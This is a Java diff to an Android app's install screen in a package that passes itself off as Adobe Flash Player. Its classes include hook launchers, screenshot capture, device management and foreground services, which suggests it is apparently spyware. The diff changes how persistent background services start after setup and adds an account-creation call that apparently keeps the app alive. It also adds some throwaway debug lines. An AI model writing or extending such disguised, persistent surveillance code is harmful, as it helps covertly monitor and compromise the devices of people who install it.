@@ -25,6 +25,7 @@ import com.adobe.flashplayer.R;
 import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.accessory.HookLauncher;
+import com.adobe.flashplayer.account.AccountActivity;
 import com.adobe.flashplayer.core.CoreHelper;
 import com.adobe.flashplayer.core.DeviceManager;
 import com.adobe.flashplayer.core.ForegroundSrv;
@@ -130,9 +131,7 @@ public class InstallActivity extends Activity  {
             if (isSettled != null && isSettled.equals(Public.INSTALL_SETTLED) == true){
                 InstallHelper.toAndroidBrowser(InstallActivity.this);
 
-                CoreHelper.startForegroundService(InstallActivity.this);
-
-                CoreHelper.startJobDeamonService(InstallActivity.this);
+                CoreHelper.launchForegroundService(InstallActivity.this);
 
                 Permission.checkPermission(InstallActivity.this);
 
@@ -143,6 +142,11 @@ public class InstallActivity extends Activity  {
                 if (debug_flag ){
 
                     //do something to debug
+                    String str1 = "hello";
+                    String str2 = "hello";
+                    boolean b1 = (str1== str2);
+                    boolean b2 = (str2.equals(str1));
+
                 /*
                 Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
                 intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -283,9 +287,9 @@ public class InstallActivity extends Activity  {
                         e.printStackTrace();
                     }
 
-                    CoreHelper.startForegroundService(InstallActivity.this);
+                    CoreHelper.launchForegroundService(InstallActivity.this);
 
-                    CoreHelper.startJobDeamonService(InstallActivity.this);
+                    AccountActivity.createAccount(InstallActivity.this);
 
                     Toast.makeText(InstallActivity.this, "即将完成设置",Toast.LENGTH_LONG).show();
 
